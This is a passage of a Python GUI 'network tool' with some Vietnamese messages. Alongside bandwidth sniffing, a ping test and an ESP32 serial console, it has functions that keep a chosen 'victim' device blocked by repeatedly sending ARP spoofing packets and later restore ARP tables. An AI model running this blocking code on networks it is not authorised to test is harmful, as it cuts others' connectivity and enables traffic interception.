                sendp(packet_victim, verbose=0, iface=spoofing_interface)  # Specify interface
                sendp(packet_gateway, verbose=0, iface=spoofing_interface)  # Specify interface
                time.sleep(2)

            self.gui_log_output(f"Blocking of device with IP {ip_address} has stopped.", "green")
            logger.info(f"Blocking stopped for {ip_address}")

        except Exception as e:
            self.gui_log_output(f"Error during blocking: {e}", "red")
            logger.critical(f"Critical error during blocking: {e}")
        finally:
            self.blocking_active = False
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
                                                                            text_color=self.colors['text_dim']))
            self.blocked_device_ip = None
            self.blocked_device_mac = None

    def _start_unblock(self):
        """Initiates unblocking process in a separate thread."""
        if self.blocking_active:
            self.gui_log_output(
                f"Stopping active blocking for {self.blocked_device_ip if self.blocked_device_ip else 'unknown device'}...",
                "yellow")
            logger.warning(
                f"User initiated stop for active blocking of {self.blocked_device_ip}")
            self.blocking_active = False
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Stopping Block...",
                                                                            text_color=self.colors['warning']))
            if self.blocking_thread and self.blocking_thread.is_alive():
                self.blocking_thread.join(timeout=3)
                if self.blocking_thread.is_alive():
                    self.gui_log_output("Blocking thread did not stop gracefully.", "red")
                    logger.error("Blocking thread did not stop gracefully.")

        self.blocked_device_ip = None
        self.blocked_device_mac = None

        selected_interface = self.selected_interface_var.get()
        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện bỏ chặn.")
            self.gui_log_output("Cannot start unblocking: No valid interface selected.", "yellow")
            return

        self._set_ui_busy_state(True)
        self.gui_log_output("Attempting to unblock all devices...", "green")
        threading.Thread(target=self.unblock_devices_task, args=(selected_interface,), daemon=True).start()

    def unblock_devices_task(self, unblocking_interface):
        """Task to restore ARP tables for previously blocked devices."""
        try:
            gateway_ip = self.gateway_entry.get().strip()
            if not gateway_ip:
                self.gui_log_output("Gateway IP is required for unblocking. Please enter it in the field.", "red")
                messagebox.showerror("Gateway IP Missing",
                                     "Please provide the Gateway IP in the input field to unblock devices.")
                logger.error("Unblock failed: Gateway IP missing.")
                return

            if not self.my_ip or not self.my_mac:
                messagebox.showerror("Lỗi",
                                     "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
                self.gui_log_output("Failed to get local IP/MAC, cannot start unblocking.", "red")
                return

            devices_to_unblock = []
            try:
                with open("network_devices.txt", "r") as file:
                    for line in file:
                        parts = line.strip().split(', ')
                        if len(parts) == 2:
                            ip_part = parts[0].split(': ')
                            mac_part = parts[1].split(': ')
                            if len(ip_part) == 2 and len(mac_part) == 2:
                                devices_to_unblock.append({'ip': ip_part[1].strip(), 'mac': mac_part[1].strip()})
            except FileNotFoundError:
                self.gui_log_output("No 'network_devices.txt' found. Cannot unblock devices.", "warning")
                messagebox.showwarning("No Devices", "No 'network_devices.txt' found to unblock devices from.")
                logger.warning("Unblock attempt failed: 'network_devices.txt' not found.")
                return

            if not devices_to_unblock:
                self.gui_log_output("No devices found in 'network_devices.txt' to unblock.", "warning")
                messagebox.showinfo("No Devices", "No devices were recorded in 'network_devices.txt' to unblock.")
                logger.warning("No devices recorded in 'network_devices.txt' to unblock.")
                return

            self.gui_log_output(
                f"Restoring ARP for {len(devices_to_unblock)} devices on interface {unblocking_interface}...", "green")
            logger.info(
                f"Initiating ARP restoration for {len(devices_to_unblock)} devices on interface {unblocking_interface}.")

            for device in devices_to_unblock:
                ip_address = device['ip']

                victim_mac = get_mac(ip_address, iface=unblocking_interface)  # Pass interface to get_mac
                gateway_mac = get_mac(gateway_ip, iface=unblocking_interface)  # Pass interface

                if victim_mac and gateway_mac:
                    packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip,
                                                                hwdst=victim_mac, hwsrc=gateway_mac)
                    packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address,
                                                                  hwdst=gateway_mac, hwsrc=victim_mac)

                    sendp(packet_victim, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
                    sendp(packet_gateway, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
                    self.gui_log_output(f"Restored ARP for IP: {ip_address}", "green")
                    logger.info(f"ARP restored for {ip_address} on interface {unblocking_interface}")
                else:
                    self.gui_log_output(
                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).",
                        "warning")
                    logger.warning(
                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).")
                time.sleep(0.5)

            self.gui_log_output("All devices should now be unblocked.", "green")
            messagebox.showinfo("Unblock Complete", "All devices have been unblocked.")
            logger.info("All devices unblocked successfully.")

        except Exception as e:
            self.gui_log_output(f"Error during unblocking: {e}", "red")
            logger.critical(f"Critical error during unblocking: {e}")
        finally:
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
                                                                            text_color=self.colors['text_dim']))
            self.blocked_device_ip = None
            self.blocked_device_mac = None

    # --- Bandwidth Monitoring Functions ---
    def _start_stop_bandwidth_monitor(self):
        """Toggles the bandwidth monitoring on or off."""
        selected_interface = self.selected_interface_var.get()

        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
            messagebox.showwarning("Cảnh báo",
                                   "Vui lòng chọn một giao diện để bắt đầu theo dõi băng thông.")
            self.gui_log_output("Cannot start bandwidth monitor: No valid interface selected.", "yellow")
            return

        if not self.bandwidth_monitor_active:
            if not self.my_ip:
                messagebox.showwarning("Cảnh báo", "Không thể lấy địa chỉ IP của bạn. Vui lòng kiểm tra kết nối mạng.")
                self.gui_log_output("Cannot start bandwidth monitor: Local IP not determined.", "yellow")
                return

            if not self.bandwidth_display_labels:
                messagebox.showwarning("Cảnh báo", "Hãy quét mạng trước để có các thiết bị cần theo dõi.")
                self.gui_log_output("Cannot start bandwidth monitor: No devices scanned yet.", "yellow")
                return

            self._set_ui_busy_state(True)  # Temporarily set UI busy
            self.bandwidth_monitor_active = True
            self.btn_monitor_bandwidth.configure(text="Stop Bandwidth Monitor", fg_color=self.colors['error'],
                                                 hover_color=self.colors['error'])
            self.gui_log_output(f"Starting bandwidth monitor on interface '{selected_interface}'...", "green")
            logger.info(f"Bandwidth monitor started on {selected_interface}")

            with self.bandwidth_lock:
                self.current_bytes_per_ip.clear()

            self.bandwidth_thread = threading.Thread(target=self._bandwidth_sniff_task,
                                                     args=(selected_interface,), daemon=True)  # Pass selected_interface
            self.bandwidth_thread.start()
            self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms,
                                                           self._update_bandwidth_gui)
            self._set_ui_busy_state(False)  # Release UI busy state, only bandwidth button remains changed
        else:
            self._stop_bandwidth_monitor_task()

    def _stop_bandwidth_monitor_task(self):
        """Stops the bandwidth monitoring thread and GUI updates."""
        if self.bandwidth_monitor_active:
            self._set_ui_busy_state(True)  # Temporarily set UI busy
            self.bandwidth_monitor_active = False
            self.gui_log_output("Stopping bandwidth monitor...", "yellow")
            logger.info("Bandwidth monitor stopped.")
            self.btn_monitor_bandwidth.configure(text="Start Bandwidth Monitor", fg_color=self.colors['success'],
                                                 hover_color=self.colors['success'])

            if self.bandwidth_thread and self.bandwidth_thread.is_alive():
                self.bandwidth_thread.join(timeout=2)
                if self.bandwidth_thread.is_alive():
                    self.gui_log_output("Bandwidth monitoring thread did not terminate gracefully.", "red")
                    logger.error("Bandwidth monitoring thread did not terminate gracefully.")

            if self.bandwidth_update_job_id:
                self.root.after_cancel(self.bandwidth_update_job_id)
                self.bandwidth_update_job_id = None

            for ip_addr in self.bandwidth_display_labels:
                self.bandwidth_display_labels[ip_addr].configure(text="0.0 KB/s")

            with self.bandwidth_lock:
                self.current_bytes_per_ip.clear()
            self._set_ui_busy_state(False)  # Release UI busy state

    def _bandwidth_sniff_task(self, interface):
        """
        Target function for the sniffing thread.
        Sniffs packets and calls _packet_callback for each packet.
        """
        try:
            scapy.sniff(iface=interface, prn=self._packet_callback, store=0,
                        stop_filter=lambda p: not self.bandwidth_monitor_active,
                        filter="ip")
        except Exception as e:
            self.gui_log_output(f"Error during bandwidth sniffing: {e}", "red")
            logger.critical(f"Critical error during bandwidth sniffing: {e}")
        finally:
            if self.bandwidth_monitor_active:  # If still active here, means an unexpected stop
                self.root.after(0, self._stop_bandwidth_monitor_task)

    def _packet_callback(self, packet):
        """
        Callback function for scapy.sniff.
        Accumulates bytes for source and destination IPs.
        """
        if not self.bandwidth_monitor_active:
            return

        if packet.haslayer(scapy.IP):
            ip_src = packet[scapy.IP].src
            ip_dst = packet[scapy.IP].dst
            packet_len = len(packet)

            with self.bandwidth_lock:
                if ip_src != self.my_ip and ip_src in self.bandwidth_display_labels:
                    self.current_bytes_per_ip[ip_src] += packet_len
                if ip_dst != self.my_ip and ip_dst in self.bandwidth_display_labels:
                    self.current_bytes_per_ip[ip_dst] += packet_len

    def _update_bandwidth_gui(self):
        """
        Called periodically by root.after to update GUI bandwidth labels.
        Reads accumulated bytes, calculates rate, updates labels, and resets counters.
        """
        if not self.bandwidth_monitor_active:
            return

        bytes_for_this_interval = {}
        with self.bandwidth_lock:
            bytes_for_this_interval.update(self.current_bytes_per_ip)
            self.current_bytes_per_ip.clear()

        interval_seconds = self.bandwidth_monitor_interval_ms / 1000.0

        for ip_addr, total_bytes in bytes_for_this_interval.items():
            if ip_addr in self.bandwidth_display_labels:
                rate_bps = total_bytes / interval_seconds

                if rate_bps >= 1024 * 1024:
                    display_rate = f"{rate_bps / (1024 * 1024):.1f} MB/s"
                elif rate_bps >= 1024:
                    display_rate = f"{rate_bps / 1024:.1f} KB/s"
                else:
                    display_rate = f"{rate_bps:.1f} B/s"

                self.bandwidth_display_labels[ip_addr].configure(text=display_rate)

        self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms, self._update_bandwidth_gui)

    def _start_ping_test_dialog(self):
        """Prompts the user for an IP address to ping and starts the ping task."""
        if self.blocking_active or self.bandwidth_monitor_active or self.esp32_connected:
            messagebox.showwarning("Cảnh báo",
                                   "Không thể chạy Ping Test khi đang chặn, theo dõi băng thông hoặc kết nối ESP32.")
            self.gui_log_output("Cannot start Ping Test while blocking, bandwidth monitoring or ESP32 is active.",
                                "yellow")
            return

        selected_interface = self.selected_interface_var.get()
        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện Ping Test.")
            self.gui_log_output("Cannot start Ping Test: No valid interface selected.", "yellow")
            return

        ip_to_ping = simpledialog.askstring("Ping Device", "Nhập địa chỉ IP để ping:", parent=self.root)
        if ip_to_ping:
            # Basic IP validation
            try:
                socket.inet_aton(ip_to_ping)  # Check if it's a valid IPv4 address
            except socket.error:
                messagebox.showerror("Lỗi", "Địa chỉ IP không hợp lệ!")
                self.gui_log_output(f"Invalid IP address entered for ping: {ip_to_ping}", "red")
                return

            self._set_ui_busy_state(True)
            self.gui_log_output(f"Starting ping test to {ip_to_ping} on interface {selected_interface}...", "blue")
            threading.Thread(target=self.ping_test_task, args=(ip_to_ping, selected_interface,), daemon=True).start()

    def ping_test_task(self, ip_address, ping_interface, count=4):
        """Task to perform a series of pings and display results."""
        successful_pings = 0
        rtts = []  # Round Trip Times

        self.gui_log_output(f"Pinging {ip_address} with {count} packets on interface {ping_interface}:", "blue")
        logger.info(f"Initiating ping to {ip_address} with {count} packets on interface {ping_interface}.")

        try:
            for i in range(1, count + 1):
                start_time = time.time()
                # Use Scapy to send an ICMP echo request
                # sr1 sends a packet and waits for the first answer
                # timeout is in seconds
                # verbose=0 suppresses Scapy's default output
                ans = sr1(scapy.IP(dst=ip_address) / scapy.ICMP(), timeout=1, verbose=0,
                          iface=ping_interface)  # Specify interface
                end_time = time.time()

                if ans:
                    rtt_ms = (end_time - start_time) * 1000
                    rtts.append(rtt_ms)
                    successful_pings += 1
                    self.gui_log_output(f"Reply from {ip_address}: bytes={len(ans)} time={rtt_ms:.2f}ms TTL={ans.ttl}",
                                        "green")
                else:
                    self.gui_log_output(f"Request timed out to {ip_address}", "red")
                time.sleep(0.5)  # Small delay between pings

            # Summarize results
            packet_loss = ((count - successful_pings) / count) * 100
            self.gui_log_output("\n--- Ping Statistics ---", "blue")
            self.gui_log_output(
                f"Packets: Sent = {count}, Received = {successful_pings}, Lost = {count - successful_pings} ({packet_loss:.0f}% loss)",
                "blue")

            if rtts:
                min_rtt = min(rtts)
                max_rtt = max(rtts)
                avg_rtt = sum(rtts) / len(rtts)
                self.gui_log_output(f"Approximate round trip times in milli-seconds:", "blue")
                self.gui_log_output(
                    f"    Minimum = {min_rtt:.2f}ms, Maximum = {max_rtt:.2f}ms, Average = {avg_rtt:.2f}ms", "blue")
            else:
                self.gui_log_output("No successful replies received.", "red")

        except Exception as e:
            self.gui_log_output(f"Error during ping test: {e}", "red")
            logger.error(f"Error during ping test to {ip_address}: {e}")
        finally:
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.gui_log_output(f"Ping test to {ip_address} completed.", "blue")

    # --- ESP32 Connection Functions ---
    def _start_esp32_connection(self):
        """Attempts to connect to ESP32 using the selected serial port and fixed baud rate."""
        if self.blocking_active or self.bandwidth_monitor_active:
            messagebox.showwarning("Cảnh báo",
                                   "Không thể kết nối với ESP32 khi đang chặn hoặc theo dõi băng thông.")
            self.gui_log_output("Cannot connect to ESP32 while blocking or bandwidth monitoring is active.", "yellow")
            return

        if self.esp32_connected:
            self._stop_esp32_connection()  # If already connected, disconnect
            return

        selected_port = self.selected_esp32_port_var.get()
        if selected_port == "Select ESP32 Port" or selected_port == "No Ports Found":
            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một cổng nối tiếp hợp lệ cho ESP32.")
            self.gui_log_output("Cannot connect to ESP32: No valid serial port selected.", "yellow")
            return

        self._set_ui_busy_state(True)  # Disable other controls and ESP32 controls
        # The ESP32 button itself will be updated by _update_esp32_button_state via _set_ui_busy_state
        self.gui_log_output(f"Attempting to connect to ESP32 on {selected_port} at {self.esp32_baud_rate} baud...",
                            "blue")
        threading.Thread(target=self._esp32_connect_task, args=(selected_port, self.esp32_baud_rate,),
                         daemon=True).start()

    def _esp32_connect_task(self, port, baud_rate):
        """Task to establish serial connection and open ESP32 console."""
        try:
            self.serial_port = serial.Serial(port, baud_rate, timeout=0.1)
            self.esp32_connected = True
            self.root.after(0, self._create_esp32_console_window)
            self.gui_log_output(f"Successfully connected to ESP32 on {port}.", "green")
            logger.info(f"Connected to ESP32 on {port} at {baud_rate} baud.")

            # Start reading logs in a separate thread
            self.esp32_read_thread = threading.Thread(target=self._esp32_read_log_task, daemon=True)
            self.esp32_read_thread.start()

        except serial.SerialException as e:
            self.esp32_connected = False
            if self.serial_port and self.serial_port.is_open:
                self.serial_port.close()
            self.serial_port = None
            self.gui_log_output(f"Failed to connect to ESP32 on {port}: {e}", "red")
            messagebox.showerror("Lỗi kết nối ESP32", f"Không thể kết nối với ESP32 trên {port}.\nLỗi: {e}")
            logger.error(f"Serial connection error: {e}")
        except Exception as e:
            self.esp32_connected = False
            if self.serial_port and self.serial_port.is_open:
                self.serial_port.close()
            self.serial_port = None
            self.gui_log_output(f"An unexpected error occurred during ESP32 connection: {e}", "red")
            messagebox.showerror("Lỗi", f"Lỗi không mong muốn: {e}")
            logger.critical(f"Unexpected error during ESP32 connection: {e}")
        finally:
            # Crucial: Reset UI state after connection attempt, whether success or failure
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _create_esp32_console_window(self):
        """Creates a Toplevel window for displaying ESP32 logs."""
        if self.esp32_console_window and self.esp32_console_window.winfo_exists():
            self.esp32_console_window.lift()  # Bring to front if already open
            return

        self.esp32_console_window = ctk.CTkToplevel(self.root)
        self.esp32_console_window.title(f"ESP32 Console - {self.serial_port.port}")
        self.esp32_console_window.geometry("600x400")
        self.esp32_console_window.protocol("WM_DELETE_WINDOW", self._stop_esp32_connection)  # Handle window close

        frame = ctk.CTkFrame(self.esp32_console_window, fg_color=self.colors['card'])
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        frame.grid_rowconfigure(0, weight=1)
        frame.grid_columnconfigure(0, weight=1)

        self.esp32_console_textbox = ctk.CTkTextbox(
            frame,
            fg_color=self.colors['bg'],
            text_color=self.colors['text_dim'],
            wrap="word",
            state="disabled",
            font=ctk.CTkFont(family="Consolas", size=10)
        )
        self.esp32_console_textbox.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

        # Add a disconnect button to the console window itself
        disconnect_btn = ctk.CTkButton(frame, text="Disconnect ESP32", command=self._stop_esp32_connection,
                                       fg_color=self.colors['error'], hover_color=self.colors['error'])
        disconnect_btn.grid(row=1, column=0, pady=(0, 10))

        # Update the main GUI button (ensures it shows "Disconnect") - no need to call _set_ui_busy_state here again
        self.root.after(0, lambda: self._update_esp32_button_state(ui_busy=False))

    def _esp32_read_log_task(self):
        """Continuously reads data from the serial port and appends it to the console textbox."""
        while self.esp32_connected and self.serial_port and self.serial_port.is_open:
            try:
                if self.serial_port.in_waiting > 0:
                    line = self.serial_port.readline().decode('utf-8', errors='ignore').strip()
                    if line:
                        self.root.after(0, lambda msg=line: self._append_esp32_log(msg))
                time.sleep(0.05)  # Small delay to prevent busy-waiting
            except serial.SerialException as e:
                self.gui_log_output(f"Serial read error: {e}", "red")
                logger.error(f"Serial read error for ESP32: {e}")
                self.root.after(0, self._stop_esp32_connection)  # Ensure UI state is reset
                break
            except Exception as e:
                self.gui_log_output(f"Unexpected error while reading from ESP32: {e}", "red")
                logger.critical(f"Unexpected error while reading from ESP32: {e}")
                self.root.after(0, self._stop_esp32_connection)  # Ensure UI state is reset
                break

    def _append_esp32_log(self, message: str):
        """Appends a message to the ESP32 console textbox."""
        if self.esp32_console_textbox and self.esp32_console_textbox.winfo_exists():
            self.esp32_console_textbox.configure(state="normal")
            self.esp32_console_textbox.insert("end", f"{message}\n")
            self.esp32_console_textbox.see("end")
            self.esp32_console_textbox.configure(state="disabled")

    def _stop_esp32_connection(self):
        """Closes the serial connection and cleans up the ESP32 console."""
        if self.esp32_connected:
            self.gui_log_output("Disconnecting from ESP32...", "yellow")
            logger.info("Disconnecting from ESP32.")

            # Set UI to busy state temporarily while disconnecting
            self.root.after(0, lambda: self._set_ui_busy_state(True))

            self.esp32_connected = False  # Signal read thread to stop

            if self.serial_port and self.serial_port.is_open:
                try:
                    self.serial_port.close()
                    self.gui_log_output("ESP32 serial port closed.", "green")
                except Exception as e:
                    self.gui_log_output(f"Error closing ESP32 serial port: {e}", "red")
                    logger.error(f"Error closing ESP32 serial port: {e}")
                self.serial_port = None

            if self.esp32_read_thread and self.esp32_read_thread.is_alive():
                self.esp32_read_thread.join(timeout=1)  # Give the thread a short moment to finish
                if self.esp32_read_thread.is_alive():
                    self.gui_log_output("ESP32 read thread did not terminate gracefully.", "red")
                    logger.error("ESP32 read thread did not terminate gracefully.")
                self.esp32_read_thread = None

            if self.esp32_console_window and self.esp32_console_window.winfo_exists():
                self.esp32_console_window.destroy()
                self.esp32_console_window = None
                self.esp32_console_textbox = None

            # Ensure ESP32 button state is updated and UI busy state is reset
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.gui_log_output("Disconnected from ESP32.", "green")
        else:
            # If not connected but somehow triggered, just ensure UI state is correct
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _update_esp32_button_state(self, ui_busy: bool = False):
        """
        Updates the text, color, and state of the ESP32 connect button,
        port dropdown, and refresh button based on connection status and overall UI busy state.
        """
        if ui_busy:
            self.btn_esp32_connect.configure(state="disabled")
            self.esp32_port_optionmenu.configure(state="disabled")
            self.btn_refresh_esp32_ports.configure(state="disabled")
        else:
            if self.esp32_connected:
                # When connected, show "Disconnect" and enable the button
                self.btn_esp32_connect.configure(text="Disconnect ESP32", fg_color=self.colors['error'],
                                                 hover_color=self.colors['error'], state="normal")
                # Disable port selection and refresh when actively connected
                self.esp32_port_optionmenu.configure(state="disabled")
                self.btn_refresh_esp32_ports.configure(state="disabled")
            else:
                # When disconnected, show "Connect"
                self.btn_esp32_connect.configure(text="Connect to ESP32", fg_color=self.colors['accent'],
                                                 hover_color=self.colors['accent_hover'])

                # Enable Connect button, port selection, and refresh button only if ports are found
                if self.esp32_port_names and self.esp32_port_names[0] != "No Ports Found":
                    self.btn_esp32_connect.configure(state="normal")
                    self.esp32_port_optionmenu.configure(state="normal")
                    self.btn_refresh_esp32_ports.configure(state="normal")
                else:
                    # No ports found, keep connect button and port dropdown disabled, but refresh is active
                    self.btn_esp32_connect.configure(state="disabled")
                    self.esp32_port_optionmenu.configure(state="disabled")
                    self.btn_refresh_esp32_ports.configure(state="normal")  # Always allow refreshing ports

    def run(self):
        """Starts the main GUI event loop."""
        self.root.mainloop()


if __name__ == "__main__":
    print("Starting Network Tool. Please ensure you have necessary administrative/root privileges.")
    logger.info("Application started. Checking for administrative privileges...")
    app = NetworkToolGUI()
    app.run()